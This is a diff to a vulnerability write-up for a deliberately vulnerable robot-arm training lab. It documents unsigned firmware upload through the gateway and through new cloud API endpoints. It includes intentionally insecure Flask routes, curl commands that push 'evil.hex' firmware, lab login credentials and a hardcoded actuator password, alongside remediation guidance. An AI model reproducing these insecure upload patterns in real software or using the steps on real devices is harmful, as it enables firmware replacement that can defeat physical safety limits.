@@ -8,17 +8,20 @@ owasp: "IoT I4 - Lack of Secure Update Mechanism"
 cwe: "CWE-494 (Download of Code Without Integrity Check) / CWE-345 (Insufficient Verification of Data Authenticity)"
 source_docs:
   - "src/docs/OctoBot/OPENWRT_INTEGRATION.md §4, §7 (IoT:I4)"
-  - "stages/01_spec/output/octobot-spec.md"
+  - "stages/01_spec/output/octobot-firmware-endpoints-spec.md"
   - "stages/02_implement/output/manifest.md"
 affected_components:
   - "labs/octobot/files/opt/octobot/octobot_gateway.py"
   - "labs/octobot/files/usr/lib/vulnzoo-hooks/profile-init.d/40-octobot-flash-firmware.sh"
+  - "cloud_api/octobot/app.py"
 verified_date: ""
 ---
 
 ## Why It Matters
 
 The gateway accepts a firmware image over plain HTTP and flashes it straight to the Arduino with no signature, no version check, and no origin check. An attacker who can POST to the arm replaces the controller firmware, which is the deepest possible compromise: the malicious build can ignore the servo angle clamps that are the device's last safety control, driving servos past their mechanical limits.
+
+The cloud API extends this weakness. It now exposes `/api/v1/firmware` and `/api/v2/firmware` for firmware download and upload. The v1 endpoint is a deliberate downgrade that requires no session cookie, so anyone who discovers the legacy route can upload a replacement image. The v2 endpoint requires the same operator session used by the rest of the console, but it only checks the file extension. Neither endpoint verifies a cryptographic signature, a version number, or the origin of the firmware. After a successful upload the cloud server immediately overwrites `/opt/octobot/firmware/robot_arm.hex` on the Pi, so the attack surface moves from the local network to any caller who can reach the cloud container.
 
 ## Root Cause
 
@@ -34,6 +37,38 @@ def update():
 
 Whatever `.hex` is uploaded is flashed verbatim. There is no signature verification, no firmware version gate, and the transport is cleartext HTTP, so the image can also be tampered with in transit.
 
+The same lack of verification is repeated in the cloud controller:
+
+```python
+# cloud_api/octobot/app.py
+@app.route('/api/v1/firmware', methods=['GET', 'PUT'])
+def firmware_v1():
+    # [IoT:I4] [API5:2023] Intentionally downgraded endpoint: no session check.
+    if request.method == 'GET':
+        ...
+        return send_from_directory(...)
+
+    if 'file' not in request.files:
+        return jsonify(error='no file provided'), 400
+    return save_and_push_firmware(request.files['file'], 'v1'), 200
+```
+
+v1 accepts any uploaded file and pushes it straight to `/opt/octobot/firmware/robot_arm.hex` on the Pi. v2 adds a session gate and a `.hex` extension check, but still does not validate content:
+
+```python
+# cloud_api/octobot/app.py
+@app.route('/api/v2/firmware', methods=['GET', 'PUT'])
+@login_required
+def firmware_v2():
+    ...
+    if not uploaded_file.filename or not uploaded_file.filename.lower().endswith('.hex'):
+        return jsonify(error='only .hex files are allowed'), 400
+
+    return save_and_push_firmware(uploaded_file, 'v2'), 200
+```
+
+Because the cloud server trusts the operator session as the only authorization boundary, a stolen session cookie or a downgrade to v1 is enough to replace the firmware image on the Pi.
+
 ## Steps to Reproduce
 
 ```bash
@@ -45,15 +80,53 @@ curl -s -F 'firmware=@evil.hex' http://192.168.2.1:8090/update
 # 3. The arm now runs attacker firmware; servo limits no longer enforced.
 ```
 
+Cloud endpoints:
+
+```bash
+# --- v1: unauthenticated upload ---
+# Upload any file; the cloud server replaces the Pi firmware path.
+curl -s -X PUT -F 'file=@evil.hex' http://localhost:5003/api/v1/firmware
+# -> {"version": "v1", "filename": "robot_arm.hex", "path": "/app/firmware/robot_arm.hex", "pushed": true}
+
+# Download the current firmware image without authentication.
+curl -s http://localhost:5003/api/v1/firmware -o current.hex
+
+# --- v2: session-gated upload with extension check only ---
+# Login first to obtain the session cookie.
+curl -s -c cookies.txt -X POST http://localhost:5003/login \
+     -d 'username=operator&password=octobot'
+
+# Upload a .hex file; it is pushed to the Pi.
+curl -s -b cookies.txt -X PUT -F 'file=@evil.hex' http://localhost:5003/api/v2/firmware
+# -> {"version": "v2", "filename": "robot_arm.hex", "path": "/app/firmware/robot_arm.hex", "pushed": true}
+
+# Upload a non-.hex file; rejected by the extension filter.
+curl -s -w '%{http_code}' -b cookies.txt -X PUT -F 'file=@evil.bin' http://localhost:5003/api/v2/firmware
+# -> 400 {"error": "only .hex files are allowed"}
+
+# Without a session cookie, v2 returns 401.
+curl -s -w '%{http_code}' -X PUT -F 'file=@evil.hex' http://localhost:5003/api/v2/firmware
+# -> 401
+```
+
+After step 2 or any successful cloud upload, check the Pi:
+
+```bash
+ssh root@192.168.2.1 'md5sum /opt/octobot/firmware/robot_arm.hex'
+# The hash matches the attacker-supplied image.
+```
+
 (In simulation mode, with no Arduino attached, `/update` returns `{"flashed": false, "note": "no Arduino attached"}`.)
 
 ## Expected Result
 
-The uploaded image is accepted and flashed, and the arm subsequently executes attacker-controlled firmware that no longer honors the `servo_min_angle`/`servo_max_angle` clamps.
+The uploaded image is accepted and flashed, and the arm subsequently executes attacker-controlled firmware that no longer honors the `servo_min_angle`/`servo_max_angle` clamps. On the cloud path, v1 requires no credentials and v2 only checks the session cookie and file extension, so an attacker can replace the Pi firmware image from the cloud API.
 
 ## How It Should Be
 
 Sign firmware and verify the signature on-device before flashing, reject downgrades with a monotonic version counter, and serve updates over TLS from an authenticated endpoint. The flash path must refuse any image whose signature does not chain to a trusted vendor key.
+
+For the cloud endpoints specifically, remove the unauthenticated v1 route, require a device-bound authorization check (not just a session cookie), and verify the firmware signature, version, and origin before copying the image to the Pi.
 
 ## Controls to Implement
 
@@ -62,9 +135,23 @@ Sign firmware and verify the signature on-device before flashing, reject downgra
 | Integrity | Verify a vendor signature before flashing | Reject unsigned/tampered images |
 | Anti-rollback | Monotonic firmware version gate | Block downgrade attacks |
 | Transport | TLS + authenticated `/update` | Stop MITM and anonymous upload |
+| Cloud auth | Device-bound authorization beyond session cookie | Prevent session theft from becoming a firmware replacement |
+| Cloud validation | Signature + version check on upload | Stop extension-only filtering |
+| Segregation | Remove or disable the v1 downgrade route | Close the unauthenticated path |
 
 ## Verification Checklist
 
 - [ ] `POST /update` with an unsigned `.hex` flashes successfully (with hardware)
 - [ ] No signature or version check is performed
 - [ ] The flashed image can remove the servo angle clamps
+- [ ] `GET /api/v1/firmware` returns the firmware image without authentication
+- [ ] `PUT /api/v1/firmware` with any file succeeds and replaces the Pi firmware path
+- [ ] `PUT /api/v2/firmware` without a session cookie returns 401
+- [ ] `PUT /api/v2/firmware` with a session cookie and `.hex` file succeeds
+- [ ] `PUT /api/v2/firmware` with a non-`.hex` file returns 400
+- [ ] After upload, `/opt/octobot/firmware/robot_arm.hex` on the Pi matches the uploaded file
+
+## Related Vulnerabilities
+
+- [IoT:I1 — Weak, Guessable, or Hardcoded Passwords](IoT1_Weak_Guessable_Hardcoded_Passwords.md): `GET /api/v1/firmware` lets anyone download the compiled firmware, from which `strings robot_arm.hex` recovers the hardcoded actuator password `OctoSuperBot2026`.
+- [API5:2023 — Broken Function Level Authorization](../API/API5_Broken_Function_Level_Authorization.md): `/api/v1/firmware` exposes the same firmware-management function as v2 without the session requirement.
